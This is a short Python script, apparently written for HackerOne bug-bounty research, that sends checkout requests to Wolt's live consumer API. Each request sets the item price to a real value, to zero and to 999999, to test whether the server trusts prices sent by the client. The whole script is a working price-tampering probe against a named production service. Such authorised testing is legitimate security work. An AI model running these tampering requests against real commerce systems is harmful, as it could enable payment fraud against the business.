# -*- coding: utf-8 -*-
"""价格操纵复查：三组对照（真实价/篡改0/超大值），验证服务端是否信任客户端价格"""
import requests, json, sys
sys.stdout.reconfigure(encoding='utf-8', errors='replace')

H = {
    'Origin': 'https://wolt.com',
    'App-Language': 'en', 'App-Locale': 'en',
    'X-HackerOne-Research': 'pccp',
    'Content-Type': 'application/json',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
}
U = 'https://consumer-api.wolt.com/order-xp/web/v2/pages/checkout'

PRICE_KEYS = ('payable_amount', 'item_subtotal', 'service_fee', 'total_price', 'subtotal',
              'delivery_fee', 'currency', 'use_backend_pricing_for_shadowing_only',
              'order_total', 'total_charge', 'discount')


def probe(label, price):
    body = {
        "purchase_plan": {
            "venue": {"id": "60ebeb71c6904c2caf035f71", "country": "FIN", "currency": "EUR"},
            "delivery_method": "homedelivery",
            "menu_items": [
                {"id": "60ebeb71c6904c2caf035f71", "name": "Test Item", "count": 1,
                 "base_price": price, "price": price, "end_amount": price,
                 "options": [], "category_id": "test", "exclude_from_discounts": False,
                 "restrictions": []}
            ]
        }
    }
    try:
        r = requests.post(U, json=body, headers=H, timeout=25)
        txt = r.text
    except Exception as e:
        print(f'=== {label}: price={price} -> EXC {e}')
        return
    print(f'=== {label}: price={price} -> {r.status_code} len={len(txt)}')
    if r.status_code == 200:
        d = r.json()

        def walk(o, path=''):
            if isinstance(o, dict):
                for k, v in o.items():
                    if isinstance(v, (dict, list)):
                        walk(v, path + '.' + k)
                    elif k in PRICE_KEYS:
                        print(f'  {path}.{k} = {v}')
            elif isinstance(o, list):
                for i, v in enumerate(o):
                    walk(v, f'{path}[{i}]')

        walk(d)
        print('  top keys:', list(d.keys())[:20])
        json.dump(d, open(f'D:/scan/_wolt_hunt/_checkout_{label}.json', 'w', encoding='utf-8'), ensure_ascii=False)
    else:
        print(' ', ' '.join(txt.split())[:800])


probe('real_306', 306)
probe('tampered_0', 0)
probe('huge_999999', 999999)
print('DONE')
